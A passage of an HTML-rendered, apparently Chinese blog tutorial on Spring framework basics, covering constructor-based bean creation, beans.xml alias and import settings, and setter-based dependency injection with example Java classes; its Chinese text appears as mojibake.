function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;name=&quot;</span> + name);<br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>  xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>  xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;<br><br>  &lt;bean id=<span class="hljs-string">&quot;user&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span>&gt;<br>    &lt;property name=<span class="hljs-string">&quot;name&quot;</span> value=<span class="hljs-string">&quot;qwer&quot;</span>/&gt;<br>  &lt;/bean&gt;<br>&lt;/beans&gt;<br><span class="hljs-keyword">import</span> com.kuang.pojo.User;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) context.getBean(<span class="hljs-string">&quot;user&quot;</span>);<br>        user.show();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749405.png" alt="img"><strong>åœ¨è°ƒç”¨showæ–¹æ³•ä¹‹å‰ï¼ŒUserå¯¹è±¡å·²ç»é€šè¿‡æ— å‚æ„é€ åˆå§‹åŒ–äº†</strong></p><h3 id="2-4-2-æœ‰å‚æ„é€ "><a href="#2-4-2-æœ‰å‚æ„é€ " class="headerlink" title="2.4.2 æœ‰å‚æ„é€ "></a>2.4.2 æœ‰å‚æ„é€ </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">//System.out.println(&quot;User çš„æ— å‚æ„é€ &quot;);</span><br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;name=&quot;</span> + name);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">import</span> com.kuang.pojo.User;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) context.getBean(<span class="hljs-string">&quot;user&quot;</span>);<br>        user.show();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ç¬¬ä¸€ç§ï¼šä¸‹æ ‡èµ‹å€¼"><a href="#ç¬¬ä¸€ç§ï¼šä¸‹æ ‡èµ‹å€¼" class="headerlink" title="ç¬¬ä¸€ç§ï¼šä¸‹æ ‡èµ‹å€¼"></a>ç¬¬ä¸€ç§ï¼šä¸‹æ ‡èµ‹å€¼</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--ç¬¬ä¸€ç§ï¼Œä¸‹æ ‡èµ‹å€¼    --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;qaz&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311751585.png" alt="img"></p><h4 id="ç¬¬äºŒç§ï¼šé€šè¿‡ç±»å‹åˆ›å»ºï¼Œä¸å»ºè®®ä½¿ç”¨"><a href="#ç¬¬äºŒç§ï¼šé€šè¿‡ç±»å‹åˆ›å»ºï¼Œä¸å»ºè®®ä½¿ç”¨" class="headerlink" title="ç¬¬äºŒç§ï¼šé€šè¿‡ç±»å‹åˆ›å»ºï¼Œä¸å»ºè®®ä½¿ç”¨"></a>ç¬¬äºŒç§ï¼šé€šè¿‡ç±»å‹åˆ›å»ºï¼Œä¸å»ºè®®ä½¿ç”¨</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--ç¬¬äºŒç§ï¼Œé€šè¿‡ç±»å‹åˆ›    --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;wsx&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749314.png" alt="img"></p><h4 id="ç¬¬ä¸‰ç§ï¼šç›´æ¥é€šè¿‡å‚æ•°åè®¾ç½®"><a href="#ç¬¬ä¸‰ç§ï¼šç›´æ¥é€šè¿‡å‚æ•°åè®¾ç½®" class="headerlink" title="ç¬¬ä¸‰ç§ï¼šç›´æ¥é€šè¿‡å‚æ•°åè®¾ç½®"></a>ç¬¬ä¸‰ç§ï¼šç›´æ¥é€šè¿‡å‚æ•°åè®¾ç½®</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--ç¬¬ä¸‰ç§ï¼Œç›´æ¥é€šè¿‡å‚æ•°åè®¾ç½®    --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;edc&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749550.png" alt="img"></p><h2 id="2-5-Spring-é…ç½®"><a href="#2-5-Spring-é…ç½®" class="headerlink" title="2.5 Spring é…ç½®"></a>2.5 Spring é…ç½®</h2><ul><li>åˆ«å</li></ul><p>alias è®¾ç½®åˆ«å , ä¸ºbeanè®¾ç½®åˆ«å , å¯ä»¥è®¾ç½®å¤šä¸ªåˆ«å</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--è®¾ç½®åˆ«åï¼šåœ¨è·å–Beançš„æ—¶å€™å¯ä»¥ä½¿ç”¨åˆ«åè·å–--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">alias</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userT&quot;</span> <span class="hljs-attr">alias</span>=<span class="hljs-string">&quot;userNew&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><ul><li>Beançš„é…ç½®</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--beanå°±æ˜¯javaå¯¹è±¡,ç”±Springåˆ›å»ºå’Œç®¡ç†--&gt;</span><br><br><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">id: æ˜¯beançš„å”¯ä¸€æ ‡è¯†ç¬¦,å¦‚æœæ²¡æœ‰é…ç½®id,nameå°±æ˜¯é»˜è®¤æ ‡è¯†ç¬¦</span><br><span class="hljs-comment">name: å¯ä»¥è®¾ç½®å¤šä¸ªåˆ«å,å¯ä»¥ç”¨é€—å·,åˆ†å·,ç©ºæ ¼éš”å¼€</span><br><span class="hljs-comment">class: æ˜¯beançš„å…¨é™å®šå=åŒ…å+ç±»å</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">å¦‚æœé…ç½®id,åˆé…ç½®äº†name,é‚£ä¹ˆnameæ˜¯åˆ«å</span><br><span class="hljs-comment">å¦‚æœä¸é…ç½®idå’Œname,å¯ä»¥æ ¹æ®applicationContext.getBean(.class)è·å–å¯¹è±¡;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello2 h2,h3;h4&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Hello&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Spring&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>import</li></ul><p>å›¢é˜Ÿçš„åˆä½œé€šè¿‡importæ¥å®ç° .</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">import</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;&#123;path&#125;/beans.xml&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-6-ä¾èµ–æ³¨å…¥"><a href="#2-6-ä¾èµ–æ³¨å…¥" class="headerlink" title="2.6 ä¾èµ–æ³¨å…¥"></a>2.6 ä¾èµ–æ³¨å…¥</h2><ul><li>ä¾èµ–æ³¨å…¥ï¼ˆDependency Injection,DIï¼‰ã€‚</li><li>ä¾èµ– : æŒ‡Beanå¯¹è±¡çš„åˆ›å»ºä¾èµ–äºå®¹å™¨ï¼ŒBeanå¯¹è±¡çš„ä¾èµ–èµ„æº</li><li>æ³¨å…¥ : æŒ‡Beanå¯¹è±¡æ‰€ä¾èµ–çš„èµ„æº , ç”±å®¹å™¨æ¥è®¾ç½®å’Œè£…é…</li></ul><h3 id="2-6-1-æ„é€ å™¨æ³¨å…¥"><a href="#2-6-1-æ„é€ å™¨æ³¨å…¥" class="headerlink" title="2.6.1 æ„é€ å™¨æ³¨å…¥"></a>2.6.1 æ„é€ å™¨æ³¨å…¥</h3><p><a href="https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#Xjgzu">https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#Xjgzu</a></p><h3 id="2-6-2-Set-æ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘"><a href="#2-6-2-Set-æ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘" class="headerlink" title="2.6.2 Set æ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘"></a>2.6.2 Set æ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘</h3><h4 id="æ¡ˆä¾‹ä¸‰"><a href="#æ¡ˆä¾‹ä¸‰" class="headerlink" title="æ¡ˆä¾‹ä¸‰"></a>æ¡ˆä¾‹ä¸‰</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Address address;<br>    <span class="hljs-keyword">private</span> String[] books;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; hobbys;<br>    <span class="hljs-keyword">private</span> Map&lt;String,String&gt; card;<br>    <span class="hljs-keyword">private</span> Set&lt;String&gt; game;<br>    <span class="hljs-keyword">private</span> String wife;<br>    <span class="hljs-keyword">private</span> Properties info;<br><br>    <span class="hljs-comment">//ä¸‹æ–¹å†…å®¹å¿«æ·é”®ç”Ÿæˆï¼šAlt + Insert , ç”Ÿæˆ getterå’Œsetter</span><br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Address <span class="hljs-title function_">getAddress</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> address;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAddress</span><span class="hljs-params">(Address address)</span> &#123;<br>        <span class="hljs-built_in">this</span>.address = address;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String[] getBooks() &#123;<br>        <span class="hljs-keyword">return</span> books;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBooks</span><span class="hljs-params">(String[] books)</span> &#123;<br>        <span class="hljs-built_in">this</span>.books = books;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Map&lt;String, String&gt; <span class="hljs-title function_">getCard</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> card;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCard</span><span class="hljs-params">(Map&lt;String, String&gt; card)</span> &#123;<br>        <span class="hljs-built_in">this</span>.card = card;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getHobbys</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> hobbys;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHobbys</span><span class="hljs-params">(List&lt;String&gt; hobbys)</span> &#123;<br>        <span class="hljs-built_in">this</span>.hobbys = hobbys;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Set&lt;String&gt; <span class="hljs-title function_">getGame</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> game;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setGame</span><span class="hljs-params">(Set&lt;String&gt; game)</span> &#123;<br>        <span class="hljs-built_in">this</span>.game = game;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getWife</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> wife;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setWife</span><span class="hljs-params">(String wife)</span> &#123;<br>        <span class="hljs-built_in">this</span>.wife = wife;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setInfo</span><span class="hljs-params">(Properties info)</span> &#123;<br>        <span class="hljs-built_in">this</span>.info = info;<br>    &#125;<br><br>    <span class="hljs-comment">//ä¸‹æ–¹å†…å®¹å¿«æ·é”®ç”Ÿæˆï¼šAlt + Insert , ç”Ÿæˆ toString</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, address=&quot;</span> + address +<br>                <span class="hljs-string">&quot;, books=&quot;</span> + Arrays.toString(books) +<br>                <span class="hljs-string">&quot;, hobbys=&quot;</span> + hobbys +<br>                <span class="hljs-string">&quot;, card=&quot;</span> + card +<br>                <span class="hljs-string">&quot;, game=&quot;</span> + game +<br>                <span class="hljs-string">&quot;, wife=&#x27;&quot;</span> + wife + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, info=&quot;</span> + info +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span> &#123;<br>    <span class="hljs-keyword">private</span> String address;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAddress</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> address;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAddress</span><span class="hljs-params">(String address)</span> &#123;<br>        <span class="hljs-built_in">this</span>.address = address;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Address&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;address=&#x27;&quot;</span> + address + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">import</span> com.kuang.pojo.Student;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> (Student) context.getBean(<span class="hljs-string">&quot;student&quot;</span>);<br>        System.out.println(student.toString());<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Student&#123;</span><br><span class="hljs-comment">            name=&#x27;qwer&#x27;,</span><br><span class="hljs-comment">            address=Address&#123;address=&#x27;åŒ—äº¬å¸‚æµ·æ·€åŒº&#x27;&#125;,</span><br><span class="hljs-comment">            books=[è¥¿æ¸¸è®°, çº¢æ¥¼æ¢¦, æ°´æµ’ä¼ ],</span><br><span class="hljs-comment">            hobbys=[å¬æ­Œ, çœ‹ç”µå½±, çˆ¬å±±],</span><br><span class="hljs-comment">            card=&#123;ä¸­å›½é‚®æ”¿=456456456465456, å»ºè®¾=1456682255511&#125;,</span><br><span class="hljs-comment">            game=[LOL, BOB, COC],</span><br><span class="hljs-comment">            wife=&#x27;null&#x27;,</span><br><span class="hljs-comment">            info=&#123;age=18, name=qwer&#125;&#125;</span><br><span class="hljs-comment">        */</span><br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span 